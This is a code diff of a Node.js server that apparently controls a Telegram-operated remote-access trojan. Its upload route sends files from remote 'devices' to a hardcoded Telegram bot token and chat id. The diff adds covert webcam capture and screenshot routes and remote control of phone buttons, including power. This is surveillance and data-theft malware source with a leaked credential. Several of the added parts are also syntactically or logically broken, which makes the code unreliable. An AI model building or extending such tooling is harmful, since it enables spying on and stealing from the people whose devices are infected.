@@ -6,6 +6,9 @@ const uuid4 = require('uuid')
 const multer = require('multer');
 const bodyParser = require('body-parser')
 const axios = require("axios");
+const fs = require('fs');
+const NodeWebcam = require('node-webcam');
+const desktopCapture = require('node-desktop-capture');
 
 const token = '6663574410:AAFAC7Xj0JypUpa7pi60drZAxtNhW5uD3QI'
 const id = '7152830690'
@@ -43,50 +46,76 @@ app.get('/getFile/*', function (req, res) {
   });
 })
 
+// Define route to delete uploaded files
 app.get('/deleteFile/*', function (req, res) {
-  const fileName = req.params[0]
-  const filePath = __dirname + '/uploadedFile/' + encodeURIComponent(req.params[0])
-  fs.stat(filePath, function(err, stat) {
-    if (err == null) {
-      fs.unlink(filePath, (err) => {
-        if (err) {
-          res.send(`<h1>The file "${fileName}" was not deleted</h1>` + `<br><br>` + `<h1>!Try Again!</h1>`)
+    const fileName = req.params[0];
+    const filePath = __dirname + '/uploadedFile/' + encodeURIComponent(req.params[0]);
+    fs.stat(filePath, function(err, stat) {
+        if (err == null) {
+            fs.unlink(filePath, (err) => {
+                if (err) {
+                    res.send(`<h1>The file "${fileName}" was not deleted</h1>` + `<br><br>` + `<h1>!Try Again!</h1>`);
+                } else {
+                    res.send(`<h1>The file "${fileName}" was deleted</h1>` + `<br><br>` + `<h1>Success!!!</h1>`);
+                }
+            });
+        } else if (err.code === 'ENOENT') {
+            // file does not exist
+            res.send(`<h1>"${fileName}" does not exist</h1>` + `<br><br>` + `<h1>The file dosent exist to be deleted.</h1>`);
         } else {
-          res.send(`<h1>The file "${fileName}" was deleted</h1>` + `<br><br>` + `<h1>Success!!!</h1>`)
+            res.send('<h1>Some other error: </h1>', err.code);
         }
-      });
-    } else if (err.code === 'ENOENT') {
-      // file does not exist
-      res.send(`<h1>"${fileName}" does not exist</h1>` + `<br><br>` + `<h1>The file dosent exist to be deleted.</h1>`)
-    } else {
-      res.send('<h1>Some other error: </h1>', err.code)
-    }
-  });
-})
-
-
-
-app.post("/uploadFile", upload.single('file'), (req, res) => {
-    const name = req.file.originalname
-    const file_name = req.file.filename
-    const filePath = __dirname + '/uploadedFile/' +encodeURIComponent(name)
-    const host_url = req.protocol + '://' + req.get('host')
-    fs.rename(__dirname + '/uploadedFile/' + file_name, __dirname + '/uploadedFile/' +encodeURIComponent(name), function(err) { 
-      if ( err ) console.log('ERROR: ' + err);
     });
-    appBot.sendMessage(id, `°• 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚\n\n 𝙵𝚒𝚕𝚎 𝙽𝚊𝚖𝚎: ` + name + ` \n 𝙵𝚒𝚕𝚎 𝙸𝚍: ` + file_name + `\n\n 𝙵𝚒𝚕𝚎 𝙻𝚒𝚗𝚔: ` + host_url + `/getFile/` + encodeURIComponent(name) + `\n\n 𝙳𝚎𝚕𝚎𝚝𝚎 𝙻𝚒𝚗𝚔: ` + host_url + `/deleteFile/` + encodeURIComponent(name),
-/*
-   {
-     parse_mode: "HTML",
-       reply_markup: {
-         inline_keyboard: [
-           [{text: '𝗗𝗲𝗹𝗲𝘁𝗲 𝗙𝗶𝗹𝗲', callback_data: `delete_file:${name}`}]
-         ]}
-   }, 
-   */
-{parse_mode: "HTML", disable_web_page_preview: true})
-   res.send('')
-})
+});
+
+// Define route to upload files
+app.post("/uploadFile", (req, res) => {
+    const name = req.file.originalname;
+    const file_name = req.file.filename;
+    const filePath = __dirname + '/uploadedFile/' + encodeURIComponent(name);
+    const host_url = req.protocol + '://' + req.get('host');
+    
+    // Rename the uploaded file to handle special characters in the file name
+    fs.rename(__dirname + '/uploadedFile/' + file_name, filePath, function(err) { 
+        if (err) console.log('ERROR: ' + err);
+    });
+
+    // Send the file as a document
+    appBot.sendDocument(id, filePath, { caption: `Uploaded file: ${name}` });
+
+    // Send an empty response to end the request
+    res.send('');
+});
+
+// Define route to capture front camera image
+app.get('/captureFrontCamera', function (req, res) {
+    const webcam = NodeWebcam.create({
+        device: '/dev/video0',  // Adjust device path as needed
+        callbackReturn: 'buffer'
+    });
+
+    webcam.capture('front_camera_image', (err, data) => {
+        if (err) {
+            console.error('Error capturing image:', err);
+            res.status(500).send('Error capturing image');
+        } else {
+            // Process captured image data
+            // For example, save the image or send it via response
+            res.send(data);
+        }
+});
+
+// Define route to take screenshot
+app.get('/takeScreenshot', function (req, res) {
+    desktopCapture.captureScreen().then(screenshot => {
+        // Process the screenshot
+        // For example, save it to a file or send it via response
+        res.send(screenshot);
+    }).catch(error => {
+        console.error('Error capturing screenshot:', error);
+        res.status(500).send('Error capturing screenshot');
+    });
+});
 
 app.post("/uploadText", (req, res) => {
     appBot.sendMessage(id, `°• 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚\n\n` + req.body['text'],
@@ -727,32 +756,73 @@ appBot.on("callback_query", (callbackQuery) => {
         )
     }
 
-    if (commend == 'device_button') {
-        currentUuid = uuid
-        appBot.editMessageText(`°• 𝙋𝙧𝙚𝙨𝙨 𝙗𝙪𝙩𝙩𝙤𝙣𝙨 𝙛𝙤𝙧 𝙙𝙚𝙫𝙞𝙘𝙚 : <b>${appClients.get(data.split(':')[1]).model}</b>`, {
-            width: 10000,
-            chat_id: id,
-            message_id: msg.message_id,
-            reply_markup: {
-                inline_keyboard: [
-                    [
-                        {text: '|||', callback_data: `device_btn_:${currentUuid}:recent`},
-                        {text: '■', callback_data: `device_btn_:${currentUuid}:home`},
-                        {text: '<', callback_data: `device_btn_:${currentUuid}:back`}
-                    ],
-                                        [
-                        {text: 'Vol +', callback_data: `device_btn_:${currentUuid}:vol_up`},
-                        {text: 'Vol -', callback_data: `device_btn_:${currentUuid}:vol_down`},
-                        {text: '⊙', callback_data: `device_btn_:${currentUuid}:power`}
-                    ],
-                    [
-                        {text: 'Exit 🔙', callback_data: `device_btn_:${currentUuid}:exit`}
-                    ]
-                ]
-            },
-            parse_mode: "HTML"
-        })
+    // Assuming you're using a Telegram bot framework/library
+
+// Define a function to handle button callbacks
+function handleButtonCallback(callbackData) {
+    const [command, uuid] = callbackData.split(':');
+
+    switch (command) {
+        case 'recent':
+            // Handle recent command
+            break;
+        case 'home':
+            // Handle home command
+            break;
+        case 'back':
+            // Handle back command
+            break;
+        case 'vol_up':
+            // Handle volume up command
+            break;
+        case 'vol_down':
+            // Handle volume down command
+            break;
+        case 'power':
+            // Handle power command
+            break;
+        case 'exit':
+            // Handle exit command
+            break;
+        default:
+            // Handle unknown command
+            break;
     }
+}
+
+// Assuming this is where you set up your Telegram bot and handle button clicks
+appBot.on('callback_query', (callbackQuery) => {
+    const callbackData = callbackQuery.data;
+    handleButtonCallback(callbackData);
+});
+
+// Your existing code to send the message with buttons
+if (commend == 'device_button') {
+    currentUuid = uuid;
+    appBot.editMessageText(`°• 𝙋𝙧𝙚𝙨𝙨 𝙗𝙪𝙩𝙩𝙤𝙣𝙨 𝙛𝙤𝙧 𝙙𝙚𝙫𝙞𝙘𝙚 : <b>${appClients.get(data.split(':')[1]).model}</b>`, {
+        width: 10000,
+        chat_id: id,
+        message_id: msg.message_id,
+        reply_markup: {
+            inline_keyboard: [
+                [
+                    {text: '|||', callback_data: `recent:${currentUuid}`},
+                    {text: '■', callback_data: `home:${currentUuid}`},
+                    {text: '<', callback_data: `back:${currentUuid}`}
+                ],
+                [
+                    {text: 'Vol +', callback_data: `vol_up:${currentUuid}`},
+                    {text: 'Vol -', callback_data: `vol_down:${currentUuid}`},
+                    {text: '⊙', callback_data: `power:${currentUuid}`}
+                ],
+                [
+                    {text: 'Exit 🔙', callback_data: `exit:${currentUuid}`}
+                ]
+            ]
+        },
+        parse_mode: "HTML"
+    });
+}
 
     if (commend == 'device_btn_') {
         console.log(data.split(':')[0])
@@ -893,3 +963,5 @@ setInterval(function () {
     }
 }, 5000)
 appServer.listen(process.env.PORT || 8999);
+
+    
